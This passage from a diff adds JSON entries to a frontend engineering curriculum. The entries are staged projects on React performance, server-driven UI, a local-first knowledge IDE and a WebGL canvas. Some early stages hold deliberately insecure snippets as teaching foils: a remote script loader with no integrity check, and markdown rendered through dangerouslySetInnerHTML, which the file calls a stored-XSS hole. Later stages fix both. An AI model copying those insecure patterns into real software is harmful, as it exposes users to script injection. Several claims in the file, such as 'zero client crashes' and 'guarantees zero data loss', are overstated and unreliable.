+        "react-errors-portals"
+      ],
+      "tags": [
+        "system design",
+        "architecture",
+        "caching",
+        "resilience",
+        "senior",
+        "state"
+      ]
+    },
+    {
+      "id": "inter-perf-audit",
+      "kind": "project",
+      "tier": "intermediate",
+      "difficulty": "Senior",
+      "title": "The Performance Autopsy: Measure Before You Memo",
+      "tagline": "A deliberately slow gallery, a profile, and only the fixes the profile justified.",
+      "realWorldAnalog": "The quarterly Core Web Vitals regression nobody wants to own",
+      "architecturePattern": "Measured optimisation: profile, hypothesis, change, re-measure",
+      "essence": "Take a 5,000-item image gallery that renders badly, profile it, and fix only what the measurements identify. Half the candidates who reach for useMemo cannot say what it cost or what it saved; this project requires a before-and-after number for every optimisation, and reverting any change that did not earn its place.",
+      "estimatedBuildTimeHours": 8,
+      "xp": 360,
+      "prerequisites": [
+        "inter-tested-library"
+      ],
+      "inScope": [
+        "A React Profiler trace and a Performance panel trace, before and after.",
+        "List virtualisation, with the row count and frame time recorded either side.",
+        "Route-level code splitting with a measured entry-bundle delta.",
+        "LCP, CLS and INP measured on a throttled profile, not on your laptop."
+      ],
+      "outOfScope": [
+        "A CDN or server infrastructure.",
+        "Micro-benchmarks of individual functions.",
+        "Optimising anything the profile did not flag."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Optimising by vibes",
+          "focus": "memo everywhere, no measurement",
+          "codeSnippet": "const Row = memo(({ item, onSelect }) => ...);\n\nfunction Gallery({ items }) {\n  // new function identity every render — memo on Row does nothing\n  return items.map(i => <Row key={i.id} item={i} onSelect={() => pick(i)} />);\n}\n\n<img src={url} />   {/* no width/height: every image shifts the layout */}",
+          "failureModeOrInvariant": "memo compares props shallowly and the inline arrow is a new reference every render, so all 5,000 rows re-render anyway — now with an added comparison cost. Images without dimensions produce a CLS of 0.4.",
+          "architecturalLesson": "memo is a shallow prop comparison. It is defeated by any new object, array or function identity passed as a prop, which is most props."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "Profile first",
+          "focus": "Reading a flame chart and naming the actual cost",
+          "codeSnippet": "// React Profiler: commit 412ms, 5,000 Row renders, 0 skipped\n// Performance panel: one 380ms long task, main thread blocked, INP 520ms\n\n// Hypothesis: the cost is rendering 5,000 DOM nodes, not comparing props.\n// Test: render only the visible window.\nconst rows = useVirtualizer({ count: items.length, estimateSize: () => 96 });\n// After: commit 8ms, 14 Row renders, INP 90ms",
+          "failureModeOrInvariant": "Virtualisation cuts the commit from 412ms to 8ms; the memo wrappers, re-measured, save nothing and are removed. The number, not the instinct, decided which change stayed.",
+          "architecturalLesson": "Optimisation is a hypothesis with a measurement on either side. A change with no before-and-after number is a guess that also increased complexity."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "Loading, not just rendering",
+          "focus": "Code splitting, image sizing, and the critical path",
+          "codeSnippet": "const Editor = lazy(() => import('./Editor'));   // 240kB off the entry\n\n<img src={u} width={320} height={180}\n     loading=\"lazy\" decoding=\"async\"\n     sizes=\"(max-width: 600px) 100vw, 320px\" srcSet={...} />\n\n/* content-visibility lets the browser skip offscreen layout entirely */\n.gallery-section { content-visibility: auto; contain-intrinsic-size: 600px; }",
+          "failureModeOrInvariant": "Entry bundle falls from 495kB to 69kB and LCP from 4.1s to 1.6s on a throttled profile. CLS goes to 0 because every image reserves its box before it loads.",
+          "architecturalLesson": "Rendering performance and loading performance are different problems with different tools. Web Vitals separate them for exactly that reason."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Measurement",
+          "components": [
+            "React Profiler trace",
+            "Performance panel trace",
+            "Lighthouse run",
+            "bundle analyser"
+          ],
+          "invariants": [
+            "Every optimisation has a recorded before and after number."
+          ]
+        },
+        {
+          "layer": "Render",
+          "components": [
+            "virtualiser",
+            "stable callback identities",
+            "justified memo boundaries"
+          ],
+          "invariants": [
+            "No memo survives that did not change a measurement."
+          ]
+        },
+        {
+          "layer": "Load",
+          "components": [
+            "route-level lazy imports",
+            "responsive images",
+            "content-visibility"
+          ],
+          "invariants": [
+            "Every image reserves its space before it loads."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "React Advanced",
+          "topic": "Performance",
+          "subtopic": "memo, useMemo, useCallback, virtualization, profiling",
+          "howCovered": "Each tool is applied, measured, and reverted if the measurement did not justify it.",
+          "conceptIds": [
+            "react-perf"
+          ]
+        },
+        {
+          "category": "Web Platform",
+          "topic": "How a page becomes pixels",
+          "subtopic": "Critical rendering path, LCP, CLS, INP",
+          "howCovered": "All three vitals are measured on a throttled profile before and after each loading change.",
+          "conceptIds": [
+            "web-how-page-loads"
+          ]
+        },
+        {
+          "category": "Tooling",
+          "topic": "Build",
+          "subtopic": "Webpack, Vite, tree shaking and code splitting",
+          "howCovered": "Route-level dynamic imports are introduced and the entry-bundle delta is read from the analyser.",
+          "conceptIds": [
+            "tooling-bundlers"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Responsive",
+          "subtopic": "Media queries, container queries and responsive images",
+          "howCovered": "srcSet and sizes are driven by the same breakpoints as the layout, and measured on a slow connection.",
+          "conceptIds": [
+            "css-media-container",
+            "css-ratio-logical"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Long tasks and the main thread",
+          "mechanism": "Any task over 50ms blocks input handling until it yields.",
+          "realWorldImpact": "Directly explains a poor INP score and why virtualisation improved responsiveness.",
+          "conceptIds": [
+            "web-how-page-loads",
+            "js-event-loop"
+          ]
+        },
+        {
+          "domain": "V8 Engine & Memory",
+          "title": "Allocation pressure",
+          "mechanism": "Objects allocated per render are collected in the young generation, pausing the main thread.",
+          "realWorldImpact": "Explains why stable identities help beyond just satisfying memo.",
+          "conceptIds": [
+            "react-perf"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Virtualiser windowing maths",
+          "Bundler code splitting"
+        ],
+        "manualEngineeringRequired": [
+          "Reading the flame chart and forming the hypothesis.",
+          "Reverting every optimisation that did not move a number."
+        ]
+      },
+      "conceptIds": [
+        "react-perf",
+        "web-how-page-loads",
+        "tooling-bundlers",
+        "css-media-container",
+        "css-ratio-logical"
+      ],
+      "tags": [
+        "performance",
+        "profiling",
+        "web vitals",
+        "bundling",
+        "senior",
+        "rendering",
+        "forms",
+        "hooks"
+      ]
+    },
+    {
+      "id": "project-pulseui",
+      "kind": "project",
+      "tier": "advanced",
+      "difficulty": "Staff",
+      "title": "PulseUI: Server-Driven UI (SDUI) Orchestrator & Micro-Frontend Hub",
+      "tagline": "Enterprise SDUI and federated micro-app orchestrator streaming dynamic component trees with RSC & Subgrid.",
+      "realWorldAnalog": "Airbnb Dynamic Layout / Uber Modular Marketplace",
+      "architecturePattern": "Server-Driven UI (SDUI) BFF + Module Federation 2.0 + Hexagonal Shell",
+      "essence": "Build an enterprise Server-Driven UI orchestrator streaming backend layout ASTs and remote federated micro-apps with zero client crashes. Minimal scope (4 layout primitives, dynamic remote loader, action bus) with maximum architectural depth: Zod AST validation, Module Federation 2.0 with SRI, and CSS Subgrid multi-card alignment.",
+      "estimatedBuildTimeHours": 10,
+      "xp": 450,
+      "prerequisites": [],
+      "inScope": [
+        "Server-driven layout stream parsing 4 core primitives (Hero, Carousel, BentoGrid, ActionCard).",
+        "Module Federation 2.0 dynamic remote loader with SRI validation.",
+        "Declarative Command Bus for server actions (NAVIGATE, MODAL, MUTATE).",
+        "CSS Subgrid multi-card baseline alignment with @container queries."
+      ],
+      "outOfScope": [
+        "Visual drag-and-drop WYSIWYG page builders.",
+        "Multi-cloud CDN deployment managers.",
+        "End-user role RBAC administration portals.",
+        "Full analytics reporting chart suites."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Minimal Working Prototype",
+          "focus": "Naïve Switch Statement & Dynamic Script Tag",
+          "codeSnippet": "// Stage 1: Naïve Switch & Unvetted Script Injection\nfunction NaiveSDUIRenderer({ layout }: { layout: any }) {\n  return (\n    <div>\n      {layout.components.map((c: any) => {\n        switch (c.type) {\n          case 'hero': return <Hero data={c.data} />;\n          case 'card': return <Card data={c.data} />;\n          default: return <div>Unknown: {c.type}</div>;\n        }\n      })}\n    </div>\n  );\n}",
+          "failureModeOrInvariant": "Backend introducing a new component type before client release crashes the parser. Unsandboxed script tags allow rogue micro-frontends to crash the entire host app.",
+          "architecturalLesson": "Server-Driven UI requires recursive schema validation with graceful unknown node fallbacks, and micro-frontends require isolated error boundaries."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The Production Breakdown",
+          "focus": "Layout Shift (CLS) & Detached DOM Memory Leaks",
+          "codeSnippet": "// Stage 2: Asynchronous Remote Injection & Memory Leaks\nfunction loadRemote(url: string) {\n  const script = document.createElement('script');\n  script.src = url; // No SRI hash verification\n  document.head.appendChild(script);\n  // Detached DOM: Switching remotes fails to unmount old React roots\n}",
+          "failureModeOrInvariant": "Remote components loading asynchronously cause severe Cumulative Layout Shift (CLS). Unmounted micro-apps leak window listeners and detached DOM trees.",
+          "architecturalLesson": "Micro-frontends must enforce strict layout sizing reservations and explicit teardown lifecycles."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "The Canonical Concept Evolution",
+          "focus": "Recursive Zod AST Schema + Module Federation 2.0 with SRI + RSC",
+          "codeSnippet": "// Stage 3: Zod AST Validation + Sandboxed Remote Loader\nexport const SDUINodeSchema: z.ZodType<SDUINode> = z.lazy(() =>\n  z.discriminatedUnion('type', [\n    z.object({ type: z.literal('hero'), id: z.string(), title: z.string() }),\n    z.object({ type: z.literal('grid'), id: z.string(), children: z.array(SDUINodeSchema) }),\n    z.object({ type: z.literal('unknown'), id: z.string(), rawType: z.string() })\n  ])\n);\n\n// Sandboxed Error Boundary Wrapper\nexport function SDUISlot({ node }: { node: SDUINode }) {\n  return (\n    <ErrorBoundary fallback={<SDUIFallbackCard node={node} />}>\n      <Suspense fallback={<SDUISkeleton type={node.type} />}>\n        <DynamicFederatedComponent node={node} />\n      </Suspense>\n    </ErrorBoundary>\n  );\n}",
+          "failureModeOrInvariant": "Zero client crashes on unknown server types. Federated remotes are verified with cryptographic SRI hashes and isolated by ErrorBoundaries.",
+          "architecturalLesson": "Type-safe AST contracts and dependency sandboxing enable bulletproof enterprise server-driven architectures."
+        },
+        {
+          "stageNumber": 4,
+          "stageName": "Production Hardening & Design Elegance",
+          "focus": "CSS Subgrid Baseline Alignment, Container Queries & Telemetry",
+          "codeSnippet": "// Stage 4: CSS Subgrid Multi-Card Alignment\n// .sdui-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); }\n// .sdui-card { display: grid; grid-template-rows: subgrid; grid-row: span 3; container-type: inline-size; }\n// @container (max-width: 320px) { .sdui-card-cta { flex-direction: column; } }\n\n// Impression Telemetry via navigator.sendBeacon\nfunction flushImpressions(queue: string[]) {\n  navigator.sendBeacon('/api/telemetry', JSON.stringify({ impressions: queue }));\n}",
+          "failureModeOrInvariant": "Card headers, bodies, and CTAs align perfectly across dynamic server columns. Telemetry flushes reliably on page unload.",
+          "architecturalLesson": "Subgrid and container queries guarantee visual elegance for dynamically generated layouts."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Presentation",
+          "components": [
+            "Federated Shell",
+            "Dynamic SDUI Layout Parser",
+            "Subgrid Component Grid",
+            "Remote Error Boundary"
+          ],
+          "invariants": [
+            "Remote crashes are isolated by ErrorBoundary wrappers without breaking parent layout."
+          ]
+        },
+        {
+          "layer": "Application",
+          "components": [
+            "SDUI Component Registry",
+            "Declarative Action Dispatcher",
+            "Telemetry Impression Tracker"
+          ],
+          "invariants": [
+            "All server-driven actions pass through a centralized command bus."
+          ]
+        },
+        {
+          "layer": "Domain",
+          "components": [
+            "SDUINode Discriminated Union",
+            "SDUIAction Value Object",
+            "Layout Validator"
+          ],
+          "invariants": [
+            "Zod runtime validation guarantees client contract safety before rendering."
+          ]
+        },
+        {
+          "layer": "Infrastructure",
+          "components": [
+            "Module Federation 2.0 Loader",
+            "Edge RSC Streamer",
+            "CDN Edge Cache"
+          ],
+          "invariants": [
+            "Shared singletons (React, QueryClient) deduplicated across remote micro-apps."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "React 19",
+          "topic": "RSC Streaming",
+          "subtopic": "Server-Driven Layouts",
+          "howCovered": "Streams layout payloads from backend BFF directly into Suspense boundaries.",
+          "conceptIds": [
+            "r19-use-rsc",
+            "react-errors-portals"
+          ]
+        },
+        {
+          "category": "Architecture",
+          "topic": "Micro-Frontends",
+          "subtopic": "Module Federation 2.0",
+          "howCovered": "Dynamically resolves independent remote micro-apps at runtime with shared dependencies.",
+          "conceptIds": [
+            "tooling-bundlers",
+            "js-modules"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Modern CSS",
+          "subtopic": "Subgrid & Container Queries",
+          "howCovered": "Subgrid aligns server-composed cards; container queries adapt components to arbitrary slot widths.",
+          "conceptIds": [
+            "css-grid-align",
+            "css-media-container"
+          ]
+        },
+        {
+          "category": "Security & Invariants",
+          "topic": "Zero-Trust AST Validation",
+          "subtopic": "Zod Runtime Sanitization",
+          "howCovered": "Validates server payloads to prevent injection of unregistered UI components.",
+          "conceptIds": [
+            "ts-essentials",
+            "web-security"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Security & Invariants",
+          "title": "CORS & Federated Scripts",
+          "mechanism": "Access-Control-Allow-Origin: * and crossorigin=\"anonymous\" script tags.",
+          "realWorldImpact": "Prevents security tainting while loading third-party remotes."
+        },
+        {
+          "domain": "Internet & Protocols",
+          "title": "Edge CDN Caching",
+          "mechanism": "Cache-Control: s-maxage=60, stale-while-revalidate=86400 on SDUI endpoints.",
+          "realWorldImpact": "Delivers sub-50ms TTFB for dynamic layouts cached at the edge."
+        },
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "MutationObserver Auditing",
+          "mechanism": "MutationObserver monitors DOM mutations injected by remote scripts.",
+          "realWorldImpact": "Prevents rogue remote scripts from polluting global styles."
+        },
+        {
+          "domain": "V8 Engine & Memory",
+          "title": "Detached DOM Leaks",
+          "mechanism": "Explicitly unmounts remote React roots and tears down window event listeners on MFE switch.",
+          "realWorldImpact": "Eliminates memory growth when switching between federated micro-apps."
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Module Federation plugin for dependency sharing.",
+          "React Suspense and ErrorBoundary layout isolation."
+        ],
+        "manualEngineeringRequired": [
+          "Zero-trust dynamic component registry with Zod AST sanitization.",
+          "Declarative JSON action dispatcher.",
+          "Cross-MFE custom event bus with structured schema enforcement."
+        ]
+      },
+      "conceptIds": [
+        "r19-use-rsc",
+        "react-errors-portals",
+        "tooling-bundlers",
+        "js-modules",
+        "css-grid-align",
+        "css-media-container",
+        "ts-essentials",
+        "web-security"
+      ],
+      "tags": [
+        "sdui",
+        "micro-frontends",
+        "module federation",
+        "rsc",
+        "css subgrid",
+        "enterprise",
+        "layout",
+        "forms",
+        "tooling"
+      ]
+    },
+    {
+      "id": "project-chronosgraph",
+      "kind": "project",
+      "tier": "advanced",
+      "difficulty": "Staff",
+      "title": "ChronosGraph: Local-First Knowledge IDE with WebGPU & CRDTs",
+      "tagline": "Offline-sync Markdown & knowledge graph IDE with WebGPU AST rendering, OPFS storage, and state-based CRDTs.",
+      "realWorldAnalog": "Obsidian / Notion / Roam Research Core",
+      "architecturePattern": "Local-First Clean Architecture + CRDT DAG + WebGPU Compute",
+      "essence": "Build a local-first personal knowledge management IDE operating with zero network latency. Minimal scope (Markdown editor, 100k-node graph, offline CRDT sync) with maximum architectural depth: OPFS SyncAccessHandle, WebGPU WGSL compute shaders, and TanStack Query offline persistence.",
+      "estimatedBuildTimeHours": 12,
+      "xp": 450,
+      "prerequisites": [],
+      "inScope": [
+        "Local-first Markdown note editor with instant persistence.",
+        "100,000-node force-directed graph running on WebGPU compute shaders.",
+        "Offline-first CRDT state vector synchronization over WebSockets.",
+        "CSS Subgrid hierarchical outliner property table."
+      ],
+      "outOfScope": [
+        "Third-party plugin store & sandbox runtime.",
+        "Live multiplayer voice chat channels.",
+        "Complex enterprise multi-tenant team billing.",
+        "PDF annotation and drawing toolbars."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Minimal Working Prototype",
+          "focus": "Main-Thread LocalStorage & D3 SVG Graph",
+          "codeSnippet": "// Stage 1: Main-Thread Storage & D3 SVG Force Layout\nfunction NaiveGraph({ nodes, links }: { nodes: Node[]; links: Link[] }) {\n  const svgRef = useRef<SVGSVGElement>(null);\n\n  useEffect(() => {\n    // O(N^2) CPU physics simulation blocks main thread\n    const sim = d3.forceSimulation(nodes)\n      .force('charge', d3.forceManyBody())\n      .force('link', d3.forceLink(links))\n      .on('tick', () => {\n        // Manipulates 10,000 DOM SVG elements per frame\n        d3.select(svgRef.current).selectAll('circle').attr('cx', d => d.x).attr('cy', d => d.y);\n      });\n    return () => sim.stop();\n  }, [nodes, links]);\n\n  return <svg ref={svgRef} />;\n}",
+          "failureModeOrInvariant": "D3 CPU force simulation chokes at >2,000 nodes, dropping framerates to <1 FPS. Serializing vaults to localStorage freezes user typing.",
+          "architecturalLesson": "O(N^2) graph layout physics cannot run on the CPU main thread. Storage and compute must be offloaded to dedicated workers and GPU kernels."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The Production Breakdown",
+          "focus": "Offline Sync Race Conditions & Stored XSS",
+          "codeSnippet": "// Stage 2: Naïve HTTP Sync & Raw HTML Injection\nasync function saveNote(note: Note) {\n  localStorage.setItem(note.id, JSON.stringify(note));\n  // Last-Write-Wins HTTP POST wipes out peer edits on reconnect\n  await fetch('/api/notes', { method: 'POST', body: JSON.stringify(note) });\n}\n\n// Stored XSS vulnerability in markdown renderer\nfunction MarkdownPreview({ raw }: { raw: string }) {\n  return <div dangerouslySetInnerHTML={{ __html: marked.parse(raw) }} />;\n}",
+          "failureModeOrInvariant": "Reconnecting after offline editing causes silent data overwrites. Raw markdown parsing allows malicious script injections in shared vaults.",
+          "architecturalLesson": "Local-first architecture requires state-based CRDTs for deterministic convergence and AST-level sanitization for zero-trust security."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "The Canonical Concept Evolution",
+          "focus": "WebGPU WGSL Compute + OPFS SyncAccessHandle + Yjs CRDT",
+          "codeSnippet": "// Stage 3: WebGPU Compute Shaders + Dedicated Worker OPFS\n// Dedicated Storage Worker\nconst root = await navigator.storage.getDirectory();\nconst file = await root.getFileHandle('vault.bin', { create: true });\nconst syncHandle = await file.createSyncAccessHandle();\nsyncHandle.write(crdtBinaryUpdate, { at: 0 });\nsyncHandle.flush();\n\n// WebGPU N-Body Force Compute Pass (WGSL)\n/* @compute @workgroup_size(64)\nfn simulate_forces(@builtin(global_invocation_id) id: vec3<u32>) {\n  nodes[id.x].position += nodes[id.x].velocity * params.dt;\n} */",
+          "failureModeOrInvariant": "100,000 graph nodes run at steady 60 FPS on GPU. Synchronous OPFS file access handles eliminate IndexedDB IPC serialization latency.",
+          "architecturalLesson": "WebGPU compute passes unlock desktop-grade data scale; OPFS provides native file system streaming in the browser."
+        },
+        {
+          "stageNumber": 4,
+          "stageName": "Production Hardening & Design Elegance",
+          "focus": "CSS Subgrid Outliner, AST Sanitization & Storage Quota",
+          "codeSnippet": "// Stage 4: Subgrid Outliner & AST Sanitization\nexport function OutlinerBlock({ block }: { block: ASTBlock }) {\n  return (\n    <div className=\"outliner-row\">\n      <span className=\"bullet\">•</span>\n      <SanitizedContent content={block.sanitizedAST} />\n      <span className=\"meta\">{block.timestamp}</span>\n    </div>\n  );\n}\n// CSS: .outliner-row { display: grid; grid-template-columns: subgrid; }",
+          "failureModeOrInvariant": "Knowledge outliner rows stay perfectly aligned across nested depths. Persistent storage quota prevents browser eviction.",
+          "architecturalLesson": "Production local-first apps must defend persistence guarantees with navigator.storage.persist() and AST sanitizers."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Presentation",
+          "components": [
+            "React 19 Shell",
+            "WebGPU Graph Viewport",
+            "Subgrid Outliner",
+            "Vault Tree"
+          ],
+          "invariants": [
+            "useOptimistic handles instant UI updates; use() suspends on local OPFS file reads."
+          ]
+        },
+        {
+          "layer": "Application",
+          "components": [
+            "Graph CQRS Interactors",
+            "TanStack Offline Mutation Queue",
+            "CRDT Merge Coordinator"
+          ],
+          "invariants": [
+            "All state writes go to local storage first before sync propagation."
+          ]
+        },
+        {
+          "layer": "Domain",
+          "components": [
+            "Vault Entity",
+            "CRDT State Vector Clock",
+            "Markdown AST"
+          ],
+          "invariants": [
+            "Commutative CRDT merges guarantee identical state across peers."
+          ]
+        },
+        {
+          "layer": "Infrastructure",
+          "components": [
+            "OPFS Streaming Handle",
+            "WebGPU WGSL Shaders",
+            "WebSocket Gateway"
+          ],
+          "invariants": [
+            "N-body physics runs exclusively on WebGPU compute passes."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "React 19",
+          "topic": "RSC & use() Hook",
+          "subtopic": "Resource Suspension",
+          "howCovered": "Suspends block rendering while local OPFS file streams resolve directly in JSX.",
+          "conceptIds": [
+            "r19-use-rsc"
+          ]
+        },
+        {
+          "category": "Data & APIs",
+          "topic": "TanStack Query v5",
+          "subtopic": "Offline Mutation Persist",
+          "howCovered": "Enqueues offline mutations and merges differential CRDT diffs seamlessly.",
+          "conceptIds": [
+            "state-alternatives",
+            "web-storage"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Modern CSS",
+          "subtopic": "Subgrid & Container Queries",
+          "howCovered": "Subgrid aligns nested outliner block tags, authors, and timestamps.",
+          "conceptIds": [
+            "css-grid-placement",
+            "css-grid-align"
+          ]
+        },
+        {
+          "category": "Performance",
+          "topic": "WebGPU Shaders",
+          "subtopic": "GPU Compute Passes",
+          "howCovered": "WGSL compute shaders offload O(N^2) force physics to the GPU.",
+          "conceptIds": [
+            "react-perf"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Internet & Protocols",
+          "title": "HTTP Weak ETags (W/)",
+          "mechanism": "Conditional requests to skip downloading unmodified vault sync bundles.",
+          "realWorldImpact": "Reduces sync bandwidth by 95% across active sessions."
+        },
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Background Sync API",
+          "mechanism": "Service worker intercepts offline requests and triggers Background Sync on reconnect.",
+          "realWorldImpact": "Guarantees zero data loss even if the browser tab is closed."
+        },
+        {
+          "domain": "V8 Engine & Memory",
+          "title": "ArrayBuffer Shared Views",
+          "mechanism": "Zero-copy views over binary CRDT vectors using TypedArrays.",
+          "realWorldImpact": "Eliminates memory duplication during worker exchanges."
+        },
+        {
+          "domain": "Security & Invariants",
+          "title": "Zero-Trust AST Sanitization",
+          "mechanism": "AST visitor stripping dangerous javascript: protocols prior to render.",
+          "realWorldImpact": "Prevents stored XSS attacks inside shared knowledge graphs."
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "TanStack Query query deduplication and garbage collection.",
+          "React 19 Suspense fallback coordination."
+        ],
+        "manualEngineeringRequired": [
+          "WGSL Compute & Render shaders for WebGPU graph physics.",
+          "Custom Markdown AST token stream parser in Web Workers.",
+          "Binary CRDT state vector synchronization and OPFS file access."
+        ]
+      },
+      "conceptIds": [
+        "r19-use-rsc",
+        "state-alternatives",
+        "web-storage",
+        "css-grid-placement",
+        "css-grid-align",
+        "react-perf"
+      ],
+      "tags": [
+        "local-first",
+        "webgpu",
+        "indexeddb / opfs",
+        "crdts",
+        "react 19",
+        "tanstack query"
+      ]
+    },
+    {
+      "id": "project-hypercanvas",
+      "kind": "project",
+      "tier": "advanced",
+      "difficulty": "Principal",
+      "title": "HyperCanvas: Ultra-Low Latency Infinite Vector Canvas",
+      "tagline": "Infinite vector canvas engine with 120 FPS WebGL rendering, CRDT multi-user cursors & OffscreenCanvas.",
+      "realWorldAnalog": "Figma / Miro / Excalidraw Core Engine",
+      "architecturePattern": "Clean Hexagonal + CQRS + Entity-Component System (ECS)",
+      "essence": "Build a high-performance infinite whiteboard handling 50,000+ vector shapes with sub-16ms latency. Minimal feature breadth (no auth, no billing, no menu bloat) with maximum architectural depth: WebGL2 OffscreenCanvas, BVH spatial indexing, binary WebSocket sync, and local-first CRDTs.",
+      "estimatedBuildTimeHours": 14,
+      "xp": 500,
+      "prerequisites": [],
+      "inScope": [
+        "50,000 vector shapes on an infinite pan/zoom canvas.",
+        "OffscreenCanvas WebGL2 worker pipeline running at 120 FPS.",
+        "Spatial R-Tree/BVH frustum culling O(log N).",
+        "Binary WebSocket CRDT state vector multi-user cursor sync.",
+        "CSS Subgrid multi-property token inspector panel."
+      ],
+      "outOfScope": [
+        "Multi-tenant authentication & OAuth screens.",
+        "PDF/SVG complex file export wizards.",
+        "Cloud billing & team permission hierarchies.",
+        "Rich text font kerning & paragraph formatting."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Minimal Working Prototype",
+          "focus": "Main-Thread React State Canvas",
+          "codeSnippet": "// Stage 1: Naïve 2D Canvas in React State\nfunction NaiveCanvas() {\n  const [shapes, setShapes] = useState<Shape[]>(() => generate50kShapes());\n  const canvasRef = useRef<HTMLCanvasElement>(null);\n\n  useEffect(() => {\n    const ctx = canvasRef.current?.getContext('2d');\n    if (!ctx) return;\n    ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);\n    shapes.forEach(s => {\n      ctx.fillStyle = s.color;\n      ctx.fillRect(s.x, s.y, s.w, s.h); // Main-thread synchronous loop\n    });\n  }, [shapes]);\n\n  return <canvas ref={canvasRef} onMouseMove={e => setShapes(updateActive(e))} />;\n}",
+          "failureModeOrInvariant": "Main-thread loop over 50,000 shapes takes 180ms per frame. Frame rate drops to 5 FPS with catastrophic INP jank (>200ms).",
+          "architecturalLesson": "Direct React state mutation cannot scale to high-frequency vector manipulation. UI state must be decoupled from the rendering pipeline."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The Production Breakdown",
+          "focus": "V8 Minor GC Churn & Multiplayer Race Conditions",
+          "codeSnippet": "// Stage 2: JSON Broadcast & Object Churn\nfunction broadcastMove(id: string, x: number, y: number) {\n  // Allocates 1000s of ephemeral objects/sec -> V8 nursery GC freezes\n  ws.send(JSON.stringify({ type: 'MOVE', id, x, y, timestamp: Date.now() }));\n}\n\n// Last-Write-Wins Race: Simultaneous edits overwrite each other\nws.onmessage = (e) => {\n  const update = JSON.parse(e.data);\n  setShapes(prev => prev.map(s => s.id === update.id ? { ...s, ...update } : s));\n};",
+          "failureModeOrInvariant": "JSON stringification creates 50MB/s of ephemeral heap objects triggering stop-the-world GC pauses. Uncoordinated updates cause shape overwrites.",
+          "architecturalLesson": "Multiplayer vector engines require binary serialization to eliminate GC churn and commutative CRDTs to prevent data loss."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "The Canonical Concept Evolution",
+          "focus": "OffscreenCanvas WebGL2 Worker + BVH Spatial Index + Binary CRDT",
+          "codeSnippet": "// Stage 3: OffscreenCanvas + BVH Frustum Culling + Yjs Binary CRDT\n// Main Thread Handoff\nconst offscreen = canvas.transferControlToOffscreen();\nworker.postMessage({ type: 'INIT', canvas: offscreen }, [offscreen]);\n\n// Dedicated Render Worker\nconst bvh = new BVHTree(50000);\nfunction renderLoop() {\n  const visible = bvh.queryFrustum(camera.getAABB());\n  packVerticesToStaticBuffer(visible, vertexBuffer);\n  gl.uniformMatrix3fv(uMatrixLoc, false, camera.getViewMatrix());\n  gl.drawArraysInstanced(gl.TRIANGLES, 0, 6, visible.length);\n  requestAnimationFrame(renderLoop);\n}",
+          "failureModeOrInvariant": "Rendering is offloaded 100% to Web Workers. BVH culls 49,900 offscreen shapes in O(log N) time, locking framerate at a steady 120 FPS.",
+          "architecturalLesson": "Leverage WebGL2 instancing, off-main-thread compute, and binary state vectors for institutional-scale graphics."
+        },
+        {
+          "stageNumber": 4,
+          "stageName": "Production Hardening & Design Elegance",
+          "focus": "CSS Subgrid Inspector, Virtual A11y Tree & Float32 Pooling",
+          "codeSnippet": "// Stage 4: React 19 Optimistic Subgrid Inspector & A11y Mirror\nexport function CanvasInspector({ selectedShape }: { selectedShape: Shape }) {\n  const [optimisticShape, setOptimisticShape] = useOptimistic(selectedShape);\n  return (\n    <div className=\"inspector-subgrid\">\n      <label>Position X</label>\n      <input value={optimisticShape.x} onChange={e => setOptimisticShape({ ...optimisticShape, x: +e.target.value })} />\n    </div>\n  );\n}\n// CSS: .inspector-subgrid { display: grid; grid-template-columns: subgrid; }",
+          "failureModeOrInvariant": "Zero layout shift across nested property inputs. Screen readers navigate hidden AOM mirror with full ARIA semantics.",
+          "architecturalLesson": "True masterclass engineering combines raw performance with polished UI design systems and WCAG accessibility."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Presentation",
+          "components": [
+            "React 19 Shell",
+            "OffscreenCanvas WebGL Viewport",
+            "Multiplayer Cursor LERP",
+            "Subgrid Token Panel"
+          ],
+          "invariants": [
+            "Zero main-thread vector drawing; UI renders only chrome and tools."
+          ]
+        },
+        {
+          "layer": "Application",
+          "components": [
+            "BVH Spatial Index",
+            "CRDT Sync Coordinator",
+            "CQRS Undo/Redo Engine",
+            "A11y Virtual Mirror"
+          ],
+          "invariants": [
+            "O(log N) frustum culling before dispatching draw calls."
+          ]
+        },
+        {
+          "layer": "Domain",
+          "components": [
+            "VectorShape Entity",
+            "Transform Mat3x3 Value Object",
+            "State Vector Clock"
+          ],
+          "invariants": [
+            "Commutative CRDT merges guarantee identical state across peers."
+          ]
+        },
+        {
+          "layer": "Infrastructure",
+          "components": [
+            "WebSocket Binary Protobuf",
+            "Comlink Worker Pool",
+            "Float32 Memory Pools"
+          ],
+          "invariants": [
